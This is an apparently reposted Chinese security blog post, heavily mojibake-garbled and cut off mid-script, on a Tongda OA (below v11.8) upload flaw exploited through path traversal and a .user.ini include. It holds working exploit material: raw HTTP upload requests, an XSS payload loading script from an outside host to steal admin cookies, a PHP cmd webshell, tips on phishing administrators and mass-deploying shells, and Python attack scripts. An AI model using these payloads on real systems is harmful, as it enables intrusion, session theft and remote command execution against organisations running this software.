<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HeJSZKFaVmMbZIn0EmWLMA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

é€šè¾¾ OA v11.8 ä»¥ä¸‹å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¥å£, å¯¹æ–‡ä»¶åç¼€è¿‡æ»¤ä¸å……åˆ†å¯¼è‡´äº†å…è®¸ä¸Šä¼ Â .user.ini æ–‡ä»¶å¯¼è‡´æ–‡ä»¶åŒ…å«æ¶æ„æ–‡ä»¶

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

**é€šè¾¾ OA V11.8Â ä»¥ä¸‹ç‰ˆæœ¬**

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

è¿™ä¸ªæ¼æ´æˆ‘ä½¿ç”¨äº†é€šè¾¾ OA v11.6 v11.7 v11.8 ä¸‰ä¸ªç‰ˆæœ¬è¿›è¡Œæµ‹è¯•

å…¶ä¸­å‘ç°äº†å¦‚ä¸‹å‡ ç‚¹

```
v11.6Â å¯¹æ–‡ä»¶ä¸Šä¼ ä½ç½®ä¸é™åˆ¶ï¼Œå¯ä¸Šä¼ æ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œå’ŒXSS
v11.7Â v11.8Â éƒ½å¯¹æ–‡ä»¶ä¸Šä¼ ä½ç½®åšäº†é™åˆ¶ï¼Œå¯ä¸Šä¼ æ–‡ä»¶å¯¼è‡´å‘½ä»¤æ‰§è¡Œå’ŒXSS

åœ¨Â v11.7Â v11.8Â ä¸­ä¸Šä¼ çš„Â webshellÂ æˆ‘æ²¡æœ‰ç»•è¿‡OAçš„è¿‡æ»¤ï¼Œä½†XSSå¯ä½¿ç”¨
è€ŒÂ v11.6Â å¯ä»¥XSSä»»æ„é¡µé¢ï¼Œå‘½ä»¤æ‰§è¡Œçš„webshellå¯ç»•è¿‡
```

é€šè¾¾ OA v11.6 ä¸‹è½½é“¾æ¥å¦‚ä¸‹ï¼ŒWindows ä¸‹è½½å®‰è£…ï¼Œè´¦å·ä¸º admin å¯†ç ä¸ºç©º

https://cdndown.tongda2000.com/oa/2019/TDOA11.6.exe

å‡ºç°æ¼æ´çš„æ–‡ä»¶ä¸º **webroot/general/hr/manage/staff_info/update.php**

```
<?php
include_once "inc/auth.inc.php";
include_once "inc/utility_all.php";
include_once "inc/utility_file.php";
include_once "inc/utility_field.php";
include_once "inc/utility_cache.php";
include_once "general/system/log/annual_leave_log.php";
if (strstr($BYNAME, "/") || strstr($BYNAME, "\\") || strstr($BYNAME, "..")) {
  Message(_("é”™è¯¯"), _("OAç”¨æˆ·ååŒ…å«éæ³•å­—ç¬¦ï¼"));
exit();
}
include_once "inc/header.inc.php";
echo "\r\n<body class=\"bodycolor\">\r\n";
echo "\r\n<body class=\"bodycolor\">\r\n";
$PHOTO_NAME0 = $_FILES["ATTACHMENT"]["name"];
$ATTACHMENT = $_FILES["ATTACHMENT"]["tmp_name"];
if ($PHOTO_NAME0 != "") {
  $FULL_PATH = MYOA_ATTACH_PATH . "hrms_pic";
if (!file_exists($FULL_PATH)) {
    @mkdir($FULL_PATH, 448);
  }
  $PHOTO_NAME = $USER_ID . substr($PHOTO_NAME0, strrpos($PHOTO_NAME0, "."));
  $FILENAME = MYOA_ATTACH_PATH . "hrms_pic/" . $PHOTO_NAME;
  td_copy($ATTACHMENT, $FILENAME);
if (file_exists($ATTACHMENT)) {
    unlink($ATTACHMENT);
  }
if (!file_exists($FILENAME)) {
    Message(_("é™„ä»¶ä¸Šä¼ å¤±è´¥"), _("åŸå› ï¼šé™„ä»¶æ–‡ä»¶ä¸ºç©ºæˆ–æ–‡ä»¶åå¤ªé•¿ï¼Œæˆ–é™„ä»¶å¤§äº30å…†å­—èŠ‚ï¼Œæˆ–æ–‡ä»¶è·¯å¾„ä¸å­˜åœ¨ï¼"));
    Button_Back();
exit();
  }
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibt0x7OTicibVmiczUYPicuzjkDl1iaelk5IdwWGr17DAlfc5fcpnh7qEIiacQ/640?wx_fmt=png)

åœ¨è¿™é‡Œå‚æ•° **$USER_ID** æ˜¯å¯æ§çš„ï¼Œå¹¶ä¸”æ— è¿‡æ»¤å±é™©ç¬¦å·å°±æ‹¼æ¥è¿›å»äº†ï¼Œé‚£æˆ‘ä»¬ä¼ å…¥ **../../../** æˆ‘ä»¬å°±å¯ä»¥ä»»æ„æ–‡ä»¶ä¸Šä¼ äº†

ç”±äºé€šè¾¾ OA çš„æ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„æ­»æ­»çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨ PHP çš„ **.user.ini** æ–‡ä»¶æ¥åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç”¨äºåŒ…å« PHP è¯­å¥çš„æ–‡ä»¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶å†…å®¹ä¸º

```
auto_prepend_file=peiqi.log
```

è¯·æ±‚åŒ…ä¸º

```
POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user HTTP/1.1
Host: 192.168.1.105
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 365
Connection: close
Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31
Upgrade-Insecure-Requests: 1
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 
Content-Type: text/plain
auto_prepend_file=peiqi.log
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 
æäº¤
-----------------------------17518323986548992951984057104--
```

è¿™é‡Œä¸Šä¼ äº†æ–‡ä»¶åä¸º .user.iniï¼ˆæ­¤æ–‡ä»¶çš„ä½œç”¨å¯è‡ªè¡Œæœç´¢ï¼‰

ç›®å½•ä¸ºÂ /general/reportshop/workshop/report/attachment-remark  

è¿™é‡Œå¯ä»¥å‘ç°æˆ‘ä»¬å·²ç»æˆåŠŸä¸Šä¼ äº†æ–‡ä»¶ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬å¯ä»¥åŒ…å« peiqi.log æ–‡ä»¶æ‰§è¡Œæ¶æ„ä»£ç 

æˆ‘ä»¬å…ˆåˆ©ç”¨ XSS æ¼æ´æŒç»­è·å–ç”¨æˆ·çš„ Cookie æ¥ç»´æŒæƒé™

å› ä¸ºè¿‡æ»¤çš„ä¸åŒåœ¨ v11.6 å’ŒÂ v11.7 åŠä»¥ä¸Šæœ‰ä¸åŒçš„åˆ©ç”¨æ–¹æ³•

æŸ¥çœ‹æ–‡ä»¶Â webroot/inc/utility_file.php

**v11.6 çš„æ­¤æ¥å£æ— è¿‡æ»¤  
**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibeMcor9zVXepaNyac30r5FXhm31yIQPYcqkib7O01bfnRvbJJQaeZvuQ/640?wx_fmt=png)

**v11.6 ä»¥ä¸Šç‰ˆæœ¬åˆ™è§„å®šäº†è¿™ä¸ªæ¥å£ä¸Šä¼ çš„è·¯å¾„å¿…é¡»åŒ…å«Â webroot å’Œ attachment**  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibw61vNVHPoD4L06wvETtXlC1RsZaUZ4DNJK82womWxmfJeOic4OOAxkg/640?wx_fmt=png)

```
if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {
    return false;
  }
  else {
    return true;
  }
```

**æˆ‘ä»¬å…ˆè®²è®² v11.6 çš„åˆ©ç”¨**

**å› ä¸ºæ²¡æœ‰ä¸Šä¼ ä½ç½®é™åˆ¶æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨æ¼æ´åœ¨ä¸»é¡µé¢æˆ–ç®¡ç†å‘˜é¡µé¢æ’å…¥ XSS è¯­å¥é’“é±¼æˆ–è€…è·å– Cookie ç­‰æ•æ„Ÿä¿¡æ¯**

**é¦–å…ˆä¸Šä¼  .user.ini åœ¨ç®¡ç†å‘˜ç•Œé¢ /generalÂ ç›®å½•ä¸‹**

```
POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/.user HTTP/1.1
Host: 192.168.1.105
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 365
Connection: close
Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31
Upgrade-Insecure-Requests: 1

-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 
Content-Type: text/plain

auto_prepend_file=peiqi.log
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 

æäº¤
-----------------------------17518323986548992951984057104--
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibC975FOsSFic8SZQiazB4abibjoZn3y7Std6xk2ldQu3t4IJ3MF4Vf1UuA/640?wx_fmt=png)

**å†ä¸Šä¼  peiqi.log æ–‡ä»¶åˆ°æ­¤ç›®å½•ä¸‹ï¼Œå…¶ä¸­å«æœ‰ XSS è¯­å¥**

```
POST /general/hr/manage/staff_info/update.php?USER_ID=../../general/peiqi HTTP/1.1
Host: 192.168.43.37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 374
Connection: close
Cookie: USER_NAME_COOKIE=admin; OA_USER_ID=admin; creat_work=new; PHPSESSID=51v5lqch5eqvdj1cfh3eggpbt6; SID_1=a663f5dc
Upgrade-Insecure-Requests: 1

-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 
Content-Type: text/plain

<sCRiPt sRC=//xss8.cc/0jiJ></sCrIpT>
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; 

æäº¤
-----------------------------17518323986548992951984057104--
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXib19NbkZDic0s6LLAUqf130Oiciaicrjc7gZAJKvfIgaSr2yKibibXhU382bCg/640?wx_fmt=png)

**å½“ç®¡ç†å‘˜ç™»å½•æ—¶å°±ä¼šè§¦å‘ peiqi.log ä¸­çš„ XSS è¯­å¥**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibyNib8U8VWBiaHxoKe9FkzgNEbOrusc4vA1dR80KSicV4lmzuXT5wOjlbQ/640?wx_fmt=png)

**åˆšåˆšæˆ‘ä»¬è¯´åˆ°ç‰ˆæœ¬çš„ä¸åŒåˆ©ç”¨ç‚¹ä¸åŒï¼Œæˆ‘ä»¬åªèƒ½åœ¨ webroot ç›®å½•ä¸‹æŸ¥æ‰¾å¸¦æœ‰Â **attachment** çš„ç›®å½•**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibEpB7ia8icO9hW6VFs3QVXaqHYlVxT1BHHW3hDoZ8jDFlqQgwrVGVlrTg/640?wx_fmt=png)

è¿™é‡Œ XSS çš„åˆ©ç”¨ç‚¹æœ‰ 4 ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­æœ€æœ‰å‡ ç‡ XSS çš„ä¸º**å­˜å‚¨ç›®å½•ç®¡ç†çš„æ–‡ä»¶å¤¹**

**/general/system/attachment/**

ä½¿ç”¨åŒ v11.6 çš„æ–¹æ³•ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå½“ç®¡ç†å‘˜ä½¿ç”¨æ­¤æ¨¡å—æ—¶å°±ä¼šæ‰“å›ä¸€ä¸ª Cookie  

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibyb6I5u5j7L2JlHDeCdgpOgjZNB0RXibkwALL2aHzpMPBujlEkJttZSw/640?wx_fmt=png)

å› ä¸ºåç»­ç‰ˆæœ¬é™åˆ¶ï¼Œv11.6 ä»¥ä¸Šç‰ˆæœ¬ xss ä¹Ÿå—åˆ°é™åˆ¶ï¼Œè€Œ v11.6 ç‰ˆæœ¬ä»»æ„è·¯å¾„å¯ä»¥ XSS, å¯ä»¥åœ¨éƒ¨åˆ†è¡¥ä¸æ‰“çš„æƒ…å†µä¸‹è¿›è¡Œé’“é±¼ç®¡ç†å‘˜

è¿™é‡Œæˆ‘å†™äº†ä¸€ä¸ªæµ‹è¯• POCï¼Œç”¨äºæµ‹è¯•æ˜¯å¦å­˜åœ¨æ¼æ´ï¼ˆè„šæœ¬è§æ–‡æœ«ï¼‰

```
ä¸ºäº†é˜²æ­¢XSSå½±å“æ­£å¸¸ä¸šåŠ¡
è¿™é‡Œä¸Šä¼ çš„ä½ç½®æ˜¯ä¸€ä¸ªä¸å¸¸ç”¨æ¨¡å—ç”¨äºéªŒè¯æ¼æ´
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibBfSDCtqApzlKrbjKibpEaxBpyIeVahLAHdBFia2gHjtCt7wVQDyibsiaYQ/640?wx_fmt=png)

å°±åƒåˆšåˆšä¸Šé¢çš„æ–¹æ³•ï¼ŒÂ 11.6 -11.8 ç‰ˆæœ¬ä¸­éƒ½æœ‰è¿™ä¸ªä¸Šä¼ çš„æ¼æ´

äºæ˜¯æˆ‘ä»¬å¯ä»¥åŒ…å« PHP ä»£ç æ–‡ä»¶è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ  

```
v11.6 webshellå‘½ä»¤æ‰§è¡Œå¯ä»¥ç»•è¿‡
<?php
$command=$_GET['peiqi'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

åœ¨ v11.7 v11.8 ä¸­ webshell è¢«æ‹¦æˆªäº†ï¼Œæˆ‘è¿˜æ²¡ç»•è¿‡å»ï¼Œæœ‰æ€è·¯çš„å¸ˆå‚…ç§ä¿¡æˆ‘äº¤æµä¸‹æ„è§  

**ä¸Šä¼ æ€è·¯ä¸ XSS æ¼æ´ä¸€è‡´ï¼Œåªä¸è¿‡æ–‡ä»¶åŒ…å«çš„å˜æˆ PHP ä»£ç **

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibG1qfqQe5xJKPib5iaUuTaJkrKYFWucQLpHWficnhBb0sRrUCWVyXQZFsQ/640?wx_fmt=png)

ç°åœ¨å·²ç»æˆåŠŸä¸Šä¼ äº†æ¶æ„æ–‡ä»¶

è®¿é—® http://xxx.xxx.xxx.xxx/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=ipconfig

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibQgicRGQgRs8htPrwVOloHb9tuxOl6AUyw1BkKtuKzbSRTnpmfB18lYg/640?wx_fmt=png)

åˆ©ç”¨çš„ POC æ•ˆæœ (æ–‡æœ«è·å–)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXib41hzPoxB8x2IPp9Jakw95qTFcfZOgcNXt0zbp5ZQhrttb3kZhQ3NEQ/640?wx_fmt=png)

```
Tips

v11.6 æœ¨é©¬å¯ä¸Šä¼ ä»»æ„ä½ç½®ï¼Œå¯ä»¥ä¸Šä¼ åœ¨ç™»å½•é¡µé¢ç›¸åŒç›®å½•ï¼Œä¸éœ€è¦æƒé™å³å¯æ‰§è¡Œå‘½ä»¤
v11.7 v11.8 æœ¨é©¬ç»•è¿‡ç¬¬ä¸€æ—¶é—´å‘æ–‡

v11.6Â XSSåœ¨ç™»å½•é¡µé¢å’Œç®¡ç†å‘˜é¡µé¢å‡å¯ï¼ŒXSSè¯­å¥æ€ä¹ˆå¥½ç”¨æ€ä¹ˆæ¥
v11.7Â v11.8Â XSSä½ç½®æœ‰é™åˆ¶ï¼Œä¸è¿‡ä¹Ÿæœ‰æœºä¼š

ä¹‹å‰çˆ†å‡ºçš„é€šè¾¾OAÂ 11.7ä»»æ„ç”¨æˆ·ç™»å½•ä¹Ÿå¯ä»¥åˆ©ç”¨ä¸Š
å¯ä»¥å†™è„šæœ¬æ£€æµ‹ç›®æ ‡ä¸€ä½†ä¸Šçº¿Â XSSÂ ä¸Â webshellÂ ä¸€èµ·ä¸Šä¼ 
```

```
ä¸Šé¢çš„æ€è·¯å‚è€ƒäº†Â LoRexxarÂ å¸ˆå‚…çš„æ–‡ç« ï¼Œå¤§å®¶å¯ä»¥çœ‹ä¸€ä¸‹
https://paper.seebug.org/1499/
```

****å››:Â  æ¼æ´ POCğŸ¦‰****

```
ç”±äºæ˜¯åå°æ¼æ´ï¼Œæµ‹è¯•æ—¶è¯·ä¿®æ”¹POCä¸­çš„Cookie
```

**é€šè¾¾ OA XSS POC**

```
import requests
import sys
import random
import re
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: é€šè¾¾OA < V11.8                                             \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "æ¡£æ¡ˆå·²ä¿å­˜" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie":  Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KClBlaVFpX1dpa2kKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0=")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \033[0m".format(target_url))
        if "æ¡£æ¡ˆå·²ä¿å­˜" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  peiqi.log æ–‡ä»¶, \033[0m".format(target_url))
            POC_3(target_url, Cookie)
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  peiqi.log æ–‡ä»¶å¤±è´¥\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_3(target_url, Cookie):
    vuln_url = target_url + "/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie":  Cookie,
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?peiqi=peiqi \033[0m".format(target_url))
        if "PeiQi_Wiki" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« PeiQi_Wiki,å­˜åœ¨XSSæ¼æ´, å¯å‚è€ƒæ–‡ç« å†™çš„åˆ©ç”¨ç‰ˆæœ¬è¿›ä¸€æ­¥æ”»å‡» \033[0m".format(target_url))
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« PeiQi_Wiki\033[0m".format(target_url))
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    Cookie = "USER_NAME_COOKIE=admin; OA_USER_ID=admin; PHPSESSID=kqfgar7u3c0ang0es41u3u67p4; SID_1=a63eb31"
    POC_1(target_url, Cookie)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el5CgwFQGMV3P6Cwu9hynOXibH8w8bcmQR1vh8ibtvVBNQOloYlGiaG6SynocmVe9t73LZud0J805cwwQ/640?wx_fmt=png)

**é€šè¾¾ OAÂ å‘½ä»¤æ‰§è¡Œ POC  
**

```
import requests
import sys
import random
import re
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: é€šè¾¾OA < V11.8                                             \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mCookie      >>> xxxxxxxxxxxxxxxxxxxxxx                             \033[0m')
    print('+  \033[36mCmd         >>> whoami                                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \033[0m".format(target_url))
        if "æ¡£æ¡ˆå·²ä¿å­˜" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \033[0m".format(target_url))
            POC_2(target_url, Cookie)
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/peiqi"
    headers = {
